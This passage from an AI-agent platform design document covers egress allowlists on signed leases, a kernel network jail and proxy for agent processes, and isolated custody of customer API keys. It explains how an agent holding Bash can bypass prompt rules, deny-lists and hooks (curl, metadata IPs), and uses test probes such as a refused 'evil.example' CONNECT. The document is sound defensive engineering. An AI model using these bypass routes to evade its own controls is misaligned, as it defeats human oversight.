**Where the hooks actually are** — this decides the whole design. `engine/.claude/settings.json` wires `bro_hook.py` at `PreToolUse` with matcher `*`, live **only** for a session whose `CLAUDE_PROJECT_DIR` is `engine/`. The repo-root `.claude/settings.json` `PreToolUse` matcher is `Edit|Write|MultiEdit|NotebookEdit` and **does not match `Bash`, `WebFetch` or `WebSearch`**. The desktop route passes `--setting-sources ""`, so **no hooks load at all**; its tool grant excludes `WebFetch`/`WebSearch`, so on the desktop the network is reached through `Bash` only, and `BRO_BASH_DENY` is empty by explicit Owner decision. *(status: `implemented`.)*

### 3.1 The axis

An **egress grant** is a fourth axis, orthogonal to the three that exist:

| axis | question | artifact | enforcer today |
|---|---|---|---|
| tool | *which verbs* | `BRO_TIERS` / `tools_for()` | CLI `--tools` — real |
| path | *which files* | `scope` / `prohibited_scope` | `enforce_scope`, engine route only |
| capability | *which effect classes* | `allowed_capabilities` | `bro_execution_lease.py`, mutating path only |
| **destination** | **which network authorities** | **`allowed_egress` (new)** | **nothing** |

All four must be satisfied; none substitutes for another. A `reader` tier with `WebFetch` withheld is not an egress grant — it is a tool grant that happens to exclude one route to the network, and `Bash` reopens it.

**It lives on the execution lease, not on `authority-policy.json`.** The reason is not taste: the lease is the only grant artifact in this tree that is Ed25519-signed by an offline issuer and verified *inside the graded party's own process* — `bro_execution_lease.py` states it exactly: "a symmetric key would let the builder mint its own lease". `authority-policy.json` is plaintext in a repo the agent can edit. A destination grant that lives only there is a grant the policed party writes. `authority-policy.json` gets a **named class**, never a host list, so it cannot drift from the lease.

**Exact declared shape**, in `contracts/execution-lease.schema.json` (source of record; `engine/schemas/` keeps a byte-identical copy gated by `tools/check_contracts_single_source.py`), added to both `required` and `properties`:

```json
"allowed_egress": {
  "type": "array",
  "uniqueItems": true,
  "maxItems": 32,
  "items": {
    "type": "string",
    "pattern": "^https://[a-z0-9]([a-z0-9-]*[a-z0-9])?(\\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*\\.[a-z]{2,63}(:[0-9]{1,5})?$"
  }
}
```

`required`, always present, **no `minItems`** — `[]` is the only way to say "no network", and an *absent* field must be a `LeaseError`, never a permissive default. That single decision is the difference between this axis and `USE_NETWORK`: `USE_NETWORK` is absent-by-default and therefore silently satisfiable everywhere it is not checked.

In `engine/agents/authority-policy.json`, a fourth field on `default`, `designated_verifier` and each `exact_overrides` entry: `"egress_class": "none"`. `none` is the default for every role, including the builder default and the designated verifier. A class name resolves to a host set in one place the lease issuer reads; a role file never carries a hostname. *(status: `not_implemented` — this is design.)*

### 3.2 How the allowlist is expressed

**Expressible:** `https://` + an exact lowercase FQDN + an optional port. Nothing else.

**Deliberately NOT expressible, and why:**

- **Wildcards / suffix matches.** `*.githubusercontent.com` is the shape that converts an allowlist into a bypass — an attacker-controlled subdomain is one registration away. It also makes "is the child's grant a subset of the parent's" undecidable, and §3.4 needs that to be a set operation. Name three hosts; `maxItems: 32` keeps "name them" bounded.
- **IP literals.** `169.254.169.254` and `127.0.0.1` are the two destinations that turn egress into privilege escalation, and an IP cannot be re-checked against the *name* the grant stated. The trailing `\.[a-z]{2,63}` label rejects IPv4; IPv6 has no dots.
- **`http://`.** A plaintext destination cannot be authenticated, so the entry would grant "whoever holds the wire", not "that host".
- **Paths and query strings.** The only layer that can enforce a destination sees `CONNECT host:port` — it cannot see a path inside TLS. Expressing a path would state an authority the enforcement point cannot deliver, which is precisely the defect `commands.rs` names by name. **Do not state what you cannot enforce.**
- **Direction.** No ingress axis; nothing in this product listens.
- **A deny-list.** That is `BRO_BASH_DENY` in another spelling — a finite matcher over an infinite set of spellings, and `ai.rs` already concedes that shape "is NOT a hard sandbox". Allow-list only.

### 3.3 Which runtime code enforces it

> **CORRECTED 2026-08-30, by the Owner.** Everything below this box was written as
> though there were one population and one jail. There are **two populations, and they
> need two different mechanisms** — not one jail carrying two lists.
>
> | Who | What it needs | Its allowlist | Its enforcement point |
> |---|---|---|---|
> | **Build agent** — Claude Code, writing code | npm, PyPI, crates.io, the git remote | `build_egress`: broad, fixed, declared | **none in this slice.** It holds `Bash`, so only a kernel jail could bind it, and jailing it re-imposes the dependency-install limit the Owner deliberately removed |
> | **Produced agent** — running a customer flow | one or two hosts, e.g. `*.bitrix24.ru` as a set of exact names | `agent_bundle::Grant.egress`, already in the tree at `core/src/agent_bundle.rs`, currently forced empty | the `StepKind::Call` arm of `core/src/repo.rs` |
>
> A produced agent never needs `npm install`; if it does at runtime, that is a defect.
> So the Owner's rule: the jail goes on the produced agent, never on every development
> spawn — and the build agent's `npm install` never meets it, because it is another road.
>
> **Two facts below are wrong, and are corrected here rather than in place** so the
> original reasoning stays readable:
>
> 1. **"the two spawn sites in `ai.rs`" — there are three.** `ai.rs:501` (the
>    `claude --version` readiness probe), `ai.rs:2306` (streaming), `ai.rs:2588`
>    (non-streaming). All three run the same binary. None of the three sets any
>    environment variable on the child today, so injecting `HTTPS_PROXY` means adding a
>    `.env(...)` where there is none.
> 2. **The produced agent has no spawn at all.** `repo.rs`'s flow runner executes
>    `Branch` and `Store` in-process and refuses `Model` and `Call`; no process is
>    created. That is not a gap — the produced agent's vocabulary is a closed four-kind
>    set with no `Bash`, so it *cannot spell around a matcher*, and a direct authorizer
>    call in the `Call` arm is a real enforcement point rather than a prompt-level
>    suggestion. The kernel namespace was invented for the population that holds `Bash`,
>    which is exactly the population that is not being jailed.
>
> **Consequence for the file this section names.** §3.3 says
> `apps/desktop/src-tauri/src/egress_proxy.rs`. The authorizer is instead at
> **`apps/desktop/src-tauri/core/src/egress_proxy.rs`**: `core` cannot see `src` — the
> dependency runs `brops` → `brops-core`, one way — so an authorizer in `src` is
> unreachable from the produced agent's enforcement point. In `core` both populations
> reach one authorizer, and `core` carries no `tokio`, so it stays pure and network-free.
> *(status: the authorizer is `implemented`; §3.3's enforcement point remains
> `not_implemented`, and `config/spec-conformance.json` says so.)*

**No such chokepoint exists today.** There is no process, no line and no primitive in this repository that can refuse an outbound connection — see the nine zero-hit domain-word searches in §3.0. This must be built. *(status: `not_implemented`.)*

There are exactly two candidate layers and only one is honest.

**(1) A tool-call destination check — defence-in-depth, and it MUST be labelled as such.** It would sit in `engine/runtime/bro_policy.py`, fed by a new `destinations` field on `ActionClassification` populated in `_direct_targets`, which today never reads `url`. **Bypassable, and the measurement above proves it rather than argues it:** `Bash` is a granted tool on both routes; `curl …` classifies `UNKNOWN`, `python3 tools/x.py` classifies `EXECUTE_CODE` with `tgts=()`, `npm test` classifies `UNKNOWN`. None of them presents a URL to any matcher, and a test suite that fetches a fixture presents nothing at all. Ship it; never call it the grant.

**(2) A network namespace around the agent process — the enforcement.** The only chokepoint that cannot be spelled around is the kernel, and the only place this repository owns the process boundary is the spawn sites in `apps/desktop/src-tauri/src/ai.rs` — **three, not two**: the readiness probe at `ai.rs:501`, the streaming agent path at `ai.rs:2306` and the non-streaming one at `ai.rs:2588`, each a `tokio::process::Command` followed by `.spawn()`. Per the correction box above, this jail is the BUILD agent's mechanism and is not in the first slice.

Enforcement sits **immediately before `.spawn()`**, in a pre-exec hook: the agent CLI and every descendant it forks run in a network namespace holding only `lo`, with no default route, and the single reachable address is a loopback-bound `CONNECT` proxy the app owns. The proxy authorizes each `CONNECT host:port` against the lease's `allowed_egress` and refuses everything else.

Why a check anywhere else is bypassable, one sentence each:

- **In the model's prompt** — that is the `scope` defect verbatim; `commands.rs` already writes `"enforcement": "none"` about exactly this.
- **In `--disallowedTools`** — a prefix matcher over tool names, and `Bash` re-parses its argument, which `ai.rs` itself admits.
- **In a `PreToolUse` hook** — it sees tool inputs, not sockets; and on the desktop route `--setting-sources ""` means no hook loads at all.
- **In the CLI's own config or env** — that is the graded party's own process, which controls its environment. `bro_execution_lease.py` already makes this exact argument for choosing Ed25519 over HMAC.

**What must be built, named:**

- `apps/desktop/src-tauri/src/egress_jail.rs` — `spawn_jailed(&mut Command, &[String])` applied at both `ai.rs` spawn sites. Linux `CLONE_NEWNET` in a pre-exec hook; sets `HTTPS_PROXY=http://127.0.0.1:<port>` and an empty `NO_PROXY` so a proxy-honouring client works and a non-honouring one has nowhere to go. **If the namespace cannot be created, the spawn FAILS** — no host-network fallback. Off Linux it refuses, exactly as `connect_broker()` returns `UnsupportedPlatform` today.
- `apps/desktop/src-tauri/src/egress_proxy.rs` — the CONNECT proxy. Resolves a name **only** if the grant names it, then **pins the resolved address and connects to that address**, so a DNS rebind cannot move an allowed name onto a denied one. One evidence record per decision, allow and deny alike.
- `engine/runtime/bro_execution_lease.py` — parse `allowed_egress` into `ExecutionLease` beside `allowed_capabilities`, and add a third `task_class` that can carry `USE_NETWORK`, because `CLASS_CAPABILITIES` plus the over-grant refusal forbid it today.

### 3.4 Why the built agent's grant is strictly weaker — and how that is checked

**The rule:** a spawned agent's grant is a subset of its spawner's on *every* axis, and a proper subset on at least one. Computed, not asserted:

- **tool:** `tools(child) ⊆ tools(parent)`
- **path:** every entry of `scope(child)` satisfies `bro_security.path_allowed(entry, scope(parent), prohibited_scope(parent))` — that function already exists and is already the predicate `enforce_scope` uses. **Reuse it; do not write a second one.**
- **destination:** `allowed_egress(child) ⊆ allowed_egress(parent)`, exact-string set inclusion. This is the second reason wildcards are refused: `⊆` must be decidable.
- **risk:** `risk_order.index(risk_ceiling(child)) ≤ risk_order.index(risk_ceiling(parent))`, using the existing `risk_order`.

**The mechanism that makes it checkable rather than asserted:** the child's lease is *minted by the supervisor from the parent's lease*, and the mint refuses a superset. `engine/tools/bro_supervisor.py` is already where `allowed_capabilities` is computed at mint time — that is the line the subset check attaches to. Because both grants are signed artifacts, monotonicity is a property a third party can verify from the evidence chain afterwards, trusting neither the parent nor the child. **The built agent cannot mint itself a grant, and the specialist that built it cannot mint one it does not hold.**

Add a CI gate — `tools/check_grant_monotonicity.py` — proving statically that no declared role's `egress_class` exceeds the conductor's, the same cross-document shape as `tools/check_residual_items.py`. Per CLAUDE.md rule 4, delete the subset check once and confirm its test goes red before it ships. *(status: `not_implemented`.)*

### 3.5 Conflicts with existing controls

1. **This requires widening a capability ceiling in audited security code.** `CLASS_CAPABILITIES` plus the over-grant refusal make `USE_NETWORK` unmintable. CLAUDE.md §6 says prefer the path that leaves audited security code untouched — **there is no such path here.** Mitigation: add a *third* `task_class` (`network-builder`) rather than editing the two existing sets, so no lease that validates today changes meaning. The `task_class` enum in `contracts/execution-lease.schema.json` must widen in lockstep with its mirror.
2. **`--setting-sources ""` is load-bearing for an unrelated reason** — it stops the repo's `Stop` hook wedging a headless turn. Any design placing egress enforcement in a hook loses to it outright. This is why enforcement is at the spawn.
3. **`BRO_BASH_DENY` is empty by an explicit, twice-repeated Owner instruction.** An egress jail re-imposes the dependency-install limit he deliberately removed: `npm install`, `pip install`, `cargo fetch` stop unless the registry hosts are in `allowed_egress`. It is not the same decision — he removed a deny-list over *spellings*; this is an allow-list over *destinations* — but the effect on his workflow overlaps. **This needs the Owner's word before it ships.**
4. **Release Grant V3 and the git remote.** `git fetch`/`git clone` classify with no `USE_NETWORK` (measured), and push is routed to Release Grant V3. A jail that blocks the origin host fails a push *after* its nonce is reserved — two controllers on one action. Resolution: the origin host must be in `allowed_egress` for any lease whose mode includes `release`, gated beside `tools/check_release_signing.py`.
5. **`config/reachability-declarations.json` / `tools/check_reachability.py`.** `egress_proxy.rs` will exist before the jail is on the product path. Declare it, or CI goes RED — and an undeclared unreachable symbol is O-1's exact shape.
6. **`tools/check_capabilities.py`.** If proxy state is exposed as a Tauri command it must appear in `src/lib.rs` `generate_handler!`, `build.rs`, `command-policy.json` and `capabilities/default.json` or CI fails. Its tier is `R` at most — never `A` or `X`.
7. **`contracts/` is the single source.** Editing `engine/schemas/execution-lease.schema.json` alone turns `check_contracts_single_source.py` RED. Both copies, one commit.
8. **`BRO_PROTECTED_PATHS` covers `engine/runtime`, the schemas/contracts and `tools/`.** A governed desktop turn **cannot implement this design** — the protected-path deny patterns refuse the write and `TrustSurfaceGuard` reverts it. It needs a session at this checkout or the Owner.

### 3.6 The smallest end-to-end slice

One agent, one host, one refusal. One PR, not a milestone.

1. `allowed_egress` added to `contracts/execution-lease.schema.json` **and** the byte-identical `engine/schemas/` copy; parsed in `bro_execution_lease.py` into `ExecutionLease`; **absent ⇒ `LeaseError`**. Add `task_class: "network-builder"` whose `CLASS_CAPABILITIES` entry contains `USE_NETWORK`, so such a lease can validate at all.
2. `egress_proxy.rs`: CONNECT proxy, allowlist injected as `&[String]`, resolve-once-and-pin, one evidence record per decision. Unit-testable with **no network**: assert `CONNECT api.anthropic.com:443` admitted, `CONNECT evil.example:443` refused with a reason naming the lease id and the grant.
3. `egress_jail.rs`: `spawn_jailed` wired at the streaming spawn site **only** — leave the non-streaming path out of the first slice. Linux-only, refusing rather than falling back.
4. **The proof, RED direction first.** Spawn a `runner`-tier agent under a lease with `allowed_egress: ["https://api.anthropic.com:443"]`, task: *"run `curl -sS https://example.com` and report exactly what it printed."* Required: the transcript shows a connection failure; the evidence chain holds one `egress-denied` record naming `example.com:443` and the lease id; the agent did **not** reach the host. Then GREEN: same agent, same lease, reaching `api.anthropic.com` succeeds and leaves one `egress-allowed` record.
5. Delete the allowlist comparison once, confirm the RED test goes green, restore it (CLAUDE.md rule 4).

**What the slice proves:** the kernel refuses a destination the grant did not name, from inside a real agent turn, on the one spawn path the product uses — and it proves it through `Bash`/`curl`, the route every prompt-level and matcher-level control demonstrably misses.

**What it does not prove, stated so no one reads it as more:** it does not prove monotonicity (no child lease is minted in this slice); it does not close the `scope` defect — `commands.rs` still emits `"enforcement": "none"` and this design does not touch the path axis; it proves nothing off Linux; and it leaves the non-streaming spawn unjailed, which must be recorded as a known open route until slice two.

---

## 4 · THE CREDENTIAL PATH — the customer's own API key

**The problem this section must solve.** The customer's agent needs the customer's own API key, and
the desktop is deliberately on the untrusted side of that boundary. Measured at this head:
`integrations` gained an `auth_ref` column in `0022_integration_auth_ref.sql`, constrained to
`scheme:locator` with `scheme` in `engine: operator: keychain: env: vault:` and restated
procedurally in `repo.rs:2505 normalize_auth_ref`, whose own comment says it cannot tell a reference
from a password. Eleven files mention `auth_ref`/`authRef`, and every one of them writes it,
validates it, reads it back or renders it; a search for `keychain:` / `vault:` / `operator:` across
`engine/`, `apps/desktop/src-tauri/src` and `core/src` returns two lines, both English prose inside
test files. **Nothing resolves the reference to a secret** — which is correct for the desktop and
means the path simply stops there. Meanwhile `apps/desktop/SECURITY.md` records that no secrets are
stored in SQLite and API keys come only from the environment (`implemented` ◑), and
`engine/runtime/bro_secrets.py` can redact 11 secret shapes from text but is a scanner, not a store.
This section must specify how a customer's key **enters** (and by whose hand), **where it rests**
(and under whose OS principal), how the agent **uses** it without ever holding it — the shape
`docs/design/WAVE_3B_ISOLATED_SIGNER_DESIGN.md` §1.2 already establishes for the signing key, where
the process that needs the secret and the process that requests the work are different principals —
and why swapping a test key for a production key must require a **new lease** rather than an edit.
§1 places one constraint on the answer and it is stated in §0.4.4–5: the bundle declares **slots**
(`{slot_id, purpose, expected_scheme}`) and never material, while the *binding* of a slot to a real
secret lives outside the bundle keyed by `(bundle_digest, slot_id)` — because a binding inside the
bundle would change the digest on every rebind and silently un-approve the customer's agent the
moment they rotated a key.

### 4.0 What exists today (verified at `main` @ `fe26a78`)

**The reference column is real and it resolves to nothing.** *(status: `implemented` for the column, `not_implemented` for the resolution.)*

`integrations.auth_ref` is added by `apps/desktop/src-tauri/core/schema/0022_integration_auth_ref.sql` with a CHECK that bounds length 3..160, confines the alphabet to `[A-Za-z0-9._:/@+-]`, requires `scheme:locator` with `scheme ∈ {engine,operator,keychain,env,vault}`, and refuses 16 vendor key-material prefixes. The scheme set is closed in `core/src/domain.rs`. The same rule is restated in Rust by `normalize_auth_ref` in `core/src/repo.rs`, whose refusals never echo the rejected text.

The complete set of readers: `build.rs` (manifest), `src/lib.rs` (handler registration), `src/commands.rs` (the Tauri command), `core/src/db.rs` (migration include), `core/src/domain.rs`, `core/src/repo.rs` (validate / read / write). Frontend: `src/services/desktop.ts` and `src/features/integrationsModel.ts`.

**Nothing anywhere resolves the reference to a secret.** *(status: `not_implemented`.)* `grep -rn "auth_ref\|authRef" engine/ bridge/ contracts/` printed nothing. A grep for the five scheme prefixes across `apps/desktop/src-tauri`, `engine`, `bridge` and `apps/desktop/src` returned only `base64::engine::general_purpose` noise. Neither Cargo manifest names `keyring`, `secret-service` or any credential crate. Setting an `auth_ref` records an intended handoff target and proves nothing, exactly as the migration's own header says.

**Nothing in the UI can set it either.** *(status: `not_implemented` as a product surface.)* `grep -rn "setIntegrationAuthRef" apps/desktop/src` printed exactly one line — its own definition. Zero callers. The command is nevertheless registered and invokable: `command-policy.json` classifies `set_integration_auth_ref` as `{"tier":"X","grant":"allow"}` — X is execution/spend — with no approval gate. The Phase-9 no-secret contract test does not cover it: its `ALLOWED` map lists only `list_integrations`, `set_integration_status`, `probe_integration`, `create_integration`.

**The Phase-9 rule, quoted** from `docs/roadmap/phase-9.md`:

> **Architecture.** Connectors are declared and enabled in the desktop, but **secrets and the actual external call boundary live with the engine/operator sidecar**, not the desktop. […] The desktop orchestrates and displays; it never stores an external credential.

and: "**No credential columns** on the desktop — only references to operator/engine-held secrets", and "The desktop stores **no external secrets** (auth handoff to engine/operator)."

**Does code contradict it?** The *storage* half holds: nothing persists a secret, and `src/ai.rs` says so at source — "secrets come from the environment, never SQLite". The *call-boundary* half does not. `ai.rs` reads `ANTHROPIC_API_KEY` into `ProviderEnv`, holds it as `Provider::Anthropic { key: String }`, and sets `.header("x-api-key", key)` on a POST to `https://api.anthropic.com/v1/messages` — **from the Tauri host process, with no broker, no lease and no receipt**. *(status: `partial`)*, and gated: it needs `BROPS_ALLOW_UNGOVERNED=1`, which `src/lib.rs` sets unconditionally under the cargo feature `dev-ungoverned`. That feature is **not** default.

**The governed path has no egress at all yet.** *(status: `not_implemented`.)* `apps/desktop/src-tauri/executor/src/main.rs` states the executor "holds NO signing key, NO store handle, and NO socket, and it OPENS NOTHING ELSE — no file, no network"; it reads fds 3/4/5, writes fd 6, and its transform is "a deterministic placeholder for the pinned model-inference step". There is today no point in the governed chain where a credential could be applied, because there is no outbound call.

**Custody machinery that already exists and must be reused.** *(status: `implemented`.)*

- `engine/runtime/bro_signature.py` — "This module only ever verifies, and only ever loads public keys. […] Nothing here can produce a signature, which is the point: an enforcement point that could sign is an enforcement point that could forge."
- `engine/runtime/isolated_signer_server.py` — AF_UNIX front door, peer-authenticated by `SO_PEERCRED` at accept time, broker uid allowlisted, length-prefixed frames bounded to 512 KiB, and explicitly "a RECOMPUTE-then-sign authority, never a `sign(arbitrary_bytes)` oracle". Shared peer-cred helper: `engine/runtime/brops_socket.py`.
- `engine/runtime/bro_custody.py` — one implementation of the only custody question that matters: *can the account that reads this object also rewrite it?*, asked of the OS rather than guessed from ownership.
- `apps/desktop/src-tauri/launcher/src/main.rs` — **a non-empty environment is a confused-deputy signal and the launcher refuses.** Store inputs are digest-pinned in the lease and re-hashed from the held descriptors before the privilege drop.
- `engine/runtime/bro_secrets.py` — content redaction for `sk-ant-`, JWT, bearer, `keyed-secret`. Consumers are exactly two: `bro_recovery.py` and `bro_audit_log.py`. There is **no** Rust equivalent on the desktop side.
- `engine/runtime/bro_security.py` — git config keys are **allowlisted**, so `http.extraheader` / `credential.helper` cannot keep a subcommand read-only.

### 4.1 How it enters

**Design.** The customer's key enters at the **operator principal and nowhere else**, through a custodian CLI that reads it **from stdin only** — never argv, never an environment variable, never a Tauri command argument, never a form field.

```
customer → (stdin) → broctl cred put --ref engine:acme/api
                       ↓ (runs as the credentiald uid)
                     0600 file owned by credentiald, in a directory the desktop uid cannot enter
                       ↓ prints, and returns to the desktop
                     credential_ref_sha256 + credential_epoch   ← the only things that travel
```

**Exactly one process may ever see the plaintext: `brops-credentiald`, under its own uid.** Not the renderer, not the Tauri host, not the broker, not the recorder, not the launcher, and not the executor. This is not a new trust shape — it is `isolated_signer_server`'s shape applied to a different secret, and the reason is `bro_signature.py` restated: *a process that can read the key is a process that can spend it.*

The desktop's participation is the one command it already has. `set_integration_auth_ref` writes the `scheme:locator` and nothing else, which is correct as written. *(status: `implemented` for the write, `not_implemented` for everything to the left of it.)*

**Rejected, by name and for a reason:** an `env:` locator resolved by exporting the key into the executor's environment. The launcher refuses a non-empty environment outright. Any design that needs that variable is a change to the TCB's argv/env contract and must be refused. The `env` scheme stays in the scheme set as a *naming* convention for an operator-side holder, never as an injection mechanism.

### 4.2 Where it rests

**Design.** In a file owned by the `credentiald` uid, mode 0600, in a directory that fails `bro_custody`'s "can the reading account rewrite it?" test for the desktop's account — the same test that already guards the operator-root pin, the anti-rollback floor and the evidence store. Not in SQLite. Not in the app data directory.

**What an attacker who reaches the desktop's SQLite gets.** *(status: `implemented` — measured from the code, not assumed.)*

- The database is **plaintext**: `rusqlite` with `bundled`, no SQLCipher, no `PRAGMA key` anywhere in `core/src/db.rs`. Protection is filesystem-only: `src/lib.rs` chmods the db plus `-wal` and `-shm` to 0600 inside a 0700 data dir.
- What they read: connector `id/name/provider/status`, the `auth_ref` string, timestamps, and the `audit_events` rows. **No credential column exists**, and the CHECK plus `normalize_auth_ref` make a pasted vendor token structurally hard to store.
- What that does **not** buy, stated as the code states it: the constraint *cannot tell a reference from a secret*. `engine:hunter2` is a well-formed reference and a password. So the honest claim is **"no credential unless a caller deliberately put one there"** — and the only way to do that is to invoke `set_integration_auth_ref` directly, since no UI calls it.
- What they can **do**: repoint any connector at a different locator, silently. See §4.5(1).

### 4.3 How the agent uses it without ever holding it

**Design: a `USE_CREDENTIAL`-leased egress hop, downstream of the executor and upstream of the network, run by the custodian.** *(status: `not_implemented` — the mechanism does not exist; what follows is where it must attach.)*

```
executor (fd 6, no socket, empty env)
   │  intended request bytes — no header, no key
   ▼
recorder / broker           ← already the only party holding the sockets
   │  AF_UNIX, SO_PEERCRED, framed, bounded
   ▼
brops-credentiald  ── the ONLY holder of the plaintext ──►  https://api.vendor
   │  attaches the header itself; returns the response body
   ▼
receipt names request_sha256, credential_ref_sha256, credential_epoch
```

Three properties, each derived from something already enforced rather than invented:

1. **Peer-authenticated, not path-authenticated.** `SO_PEERCRED` at accept time, one allowlisted uid, refuse before the frame is read — verbatim the `isolated_signer_server.py` contract.
2. **Not an oracle.** The custodian must not offer `send(arbitrary_bytes, with_my_key)`. It accepts a request only when the request's digest equals the `request_sha256` the lease already pins and the launcher already re-hashes from held descriptors. This is `IsolatedSigner.sign_result`'s recompute-then-act rule applied to egress.
3. **The key never crosses a boundary the agent can observe.** The executor's environment is empty by the launcher's own refusal; the desktop's egress must not be reachable in a build where this path is live (§4.5(7)).

**Where this must NOT be bound: `generation_config`.** It is a **closed flat five-field** object — `engine_id`, `max_output_tokens`, `model`, `temperature`, `top_p` — and an unknown field is refused as `ConfigFieldSet` in `core/src/governed_prepare.rs`. Adding a credential field there changes `generation_config_sha256` on both halves of the product simultaneously. Credential identity belongs in the lease, not the request.

### 4.4 Why swapping a test key for a production key must require a NEW lease

This is not an assertion; it follows from four properties of the lease that are in the tree today.

**(a) `USE_CREDENTIAL` already exists as a capability, and no class may hold it.** It is in the schema enum in `contracts/execution-lease.schema.json` and its mirror, and in `engine/tools/registry.json`, and `CLASS_CAPABILITIES` grants it to neither `standard-builder` nor `security-maintenance`. The ceiling is live, not theoretical: the classifier emits `USE_CREDENTIAL` for `git push` and for `gh`, which is precisely why neither can ever be leased. Measured against the real validator:

```
USE_CREDENTIAL -> execution lease grants capabilities beyond its class: ['USE_CREDENTIAL']
```

**(b) A lease is an immutable signed artifact over an exact key set.** `validate_execution_lease` computes the payload key set and refuses on any difference; `ExecutionLease` is a frozen dataclass; the payload is Ed25519-verified against the operator-signed registry before any field is read — deliberately asymmetric, because the lease is consumed *inside the builder's process*. Measured:

```
extra field  -> execution lease has unexpected or missing keys
```

There is no mutate path. Changing any byte changes the signature; a re-signature is a different artifact.

**(c) Bindings are equality-checked, not negotiated.** Every one of `task_id, agent_id, session_id, repository, branch, worktree, head_sha, tree_identity` is compared for exact equality and a mismatch raises `execution lease binding mismatch: <key>`; `control_plane_digest` and `workspace_id` likewise.

**(d) A lease is single-use and the burn is atomic.** Ledger identity is `sha256(f"{lease_id}:{nonce}")`; `.active` / `.used` / `.ambiguous` markers are created with `O_EXCL`, and each reservation claims one numbered `max_tool_calls` slot file, also `O_EXCL`. The ledger must be absolute and outside the repository.

**Therefore:** "swap the key on the existing lease" is not an operation the machinery has. Grant credential use and the question becomes only *what in the lease names which credential*, and the answer must be two fields, not one:

- **`credential_ref_sha256`** — SHA-256 of the canonical `scheme:locator`. Distinguishes `engine:acme/test` from `engine:acme/prod`.
- **`credential_epoch`** — an integer the custodian increments on every rotation at the same locator. **This is the field that does the real work.** Without it, a customer who rotates the key behind `engine:acme/api` — the ordinary test→production promotion, where the *name* does not change — would have a live lease that silently covers the new key. The epoch makes rotation a payload change, and a payload change is a new signature, a new `lease_id`/`nonce`, a new ledger digest, and a fresh approval.

Both are `schema: 2` fields on `contracts/execution-lease.schema.json` (`additionalProperties: false`, so this is a genuine forward migration) plus the same two keys in `required` and in the Python required set. *(status: `not_implemented`.)*

The blast radius is then bounded by fields already enforced: `expires_at_epoch`, the `max_tool_calls` slot files, and single use.

### 4.5 Where this conflicts with an existing control

1. **`set_integration_auth_ref` is tier X / `allow` with no approval gate** and zero UI callers. Anything that can reach the Tauri surface can repoint a connector's credential reference silently. Once the reference *selects a spendable key*, that repoint is a capability change and must become approval-gated. **Direct conflict with the shipped policy file.**
2. **The desktop's audit trail of that repoint is neither tamper-evident nor attributable.** `repo::audit::record` is a plain `INSERT` into the same SQLite the writer owns — no chain, no head, no signature — and `set_auth_ref` hardcodes the actor as `("user", "gev")`, despite the same file stating that `actor_id` must be derived from trusted context and never hardcoded. An agent-driven repoint records as the human. **This is strictly weaker than the engine ledger, before O-2 is even considered.**
3. **O-2 bears directly on custody.** The audit ledger is not tamper-evident against its own writer on any real deployment: custody comes from `BRO_AUDIT_ANCHOR_SIGNER` / `BRO_AUDIT_ANCHOR_KEY_ID`, nothing in the shipped product sets either, `append()` rewrites a plaintext `.head` with no `.head.sig`, and an unkeyed `verify()` reports a truncated chain as intact. The credential path *adds the highest-value events the product will ever have* to a ledger with that property. **O-2 must close before this path is treated as auditable.**
4. **The launcher's env-clean refusal forbids the obvious implementation.** Read as a feature, not an obstacle — but it means "just export the key for the child" is a TCB change and must be refused by name.
5. **`generation_config` is a closed 5-field set.** Binding credential identity there changes the canonical byte formula on both halves. Bind it in the lease.
6. **Granting `USE_CREDENTIAL` to a task class edits `bro_execution_lease.py`** — a security-perimeter file under CLAUDE.md §6. It must be its own audited slice with a delete-and-confirm-red test, never a side effect of a feature branch.
7. **The `dev-ungoverned` build has a second, entirely un-brokered credential path in-process.** A build cannot honestly claim "the agent never holds the credential" while a code path in the same binary holds one and sets `x-api-key` itself. The two must be mutually exclusive at compile time.
8. **`bro_secrets.redact` covers two engine sinks and nothing on the Rust side.** A credential in a broker, recorder or executor stderr tail is not redacted. *(status: `partial`.)*
9. **There is no path in this repository to a production trust root** — `broctl build-registry` hardcodes `"production": false` and `keygen --production` refuses. A `credential-custodian` authority key cannot be minted for production today; the credential path inherits that blocker whole.
10. **Stale comment to fix when this lands:** `src/features/integrationsModel.ts` still says "Today the backend record has no auth-reference column". Schema 0022 added it. A documented claim, false since it was written.

### 4.6 The smallest end-to-end slice

Linux only. One connector, one locator `engine:acme/api`, one turn.

1. **`brops-credentiald`** — own uid, `brops_socket.py`'s `SO_PEERCRED` accept loop, one op `egress-request`, holding one 0600 key file that passes `bro_custody` against the desktop's account.
2. **`broctl cred put --ref engine:acme/api`** — reads the key on **stdin only**, writes it under the custodian uid, prints `credential_ref_sha256` and `credential_epoch=1`. Nothing else ever sees the bytes.
3. **`schema: 2` lease** carrying those two fields, `allowed_capabilities: ["USE_CREDENTIAL","USE_NETWORK"]`, and one task class permitted to hold them.
4. **One egress hop** in the custodian: accept only when the request digest equals the lease's pinned `request_sha256`; attach the header; one HTTPS call; return the body.
5. **The desktop's only act:** `set_integration_auth_ref(id, "engine:acme/api")` — already shipped.

**Four falsifiable pass criteria:**

| # | Assertion | How it fails |
|---|---|---|
| 1 | The turn completes and the reply carries a signed receipt naming `request_sha256`, `credential_ref_sha256`, `credential_epoch` | no receipt, or a receipt naming a request that was not executed |
| 2 | `/proc/<pid>/environ` and a memory scan of the executor, broker and Tauri host contain no key material; the executor's environ is empty by the launcher's refusal | any hit |
| 3 | **Rotate the key at the same locator (`epoch → 2`) and replay the same lease** ⇒ `LeaseError: execution lease binding mismatch: credential_epoch`, and the second turn requires a newly issued, newly approved lease | it succeeds — which is exactly the test→production swap this section exists to prevent |
| 4 | Replay the first lease at all ⇒ `execution lease already consumed` | it succeeds |

Criterion 3 is the one that proves the section's thesis, so per CLAUDE.md rule 4 it must be **deleted once and confirmed red** before it counts. The custodian's file-custody claim gets the same treatment the anchor work already uses: an actual `open()` under the desktop uid returning `EACCES` — "the operating system refuses", not "we did not write the code to try".

**What this slice would NOT prove, stated up front:** nothing about production (the gate is shut and there is no production trust root), nothing about Windows or macOS, and nothing about the durability of its own evidence — all four results are written to a ledger that is not tamper-evident against its own writer until **O-2** closes.

---

## 5 · THE SCHEDULED CALL — how `run_due()` invokes a built agent

### 5.1 What the loop is today, measured

`apps/desktop/src-tauri/src/lib.rs:367` spawns a `tokio::time::interval` of 60 s with
`MissedTickBehavior::Skip`; at `:378` each tick calls
`brops_core::repo::automations::run_due(&conn, now_ms)` and **discards the result with `let _ =`**.
`run_due` (`repo.rs:2410`) lists automations, skips disabled ones, skips any trigger
`parse_interval_ms` does not recognise, compares `now_ms` with the newest `automation_runs.ran_at`,
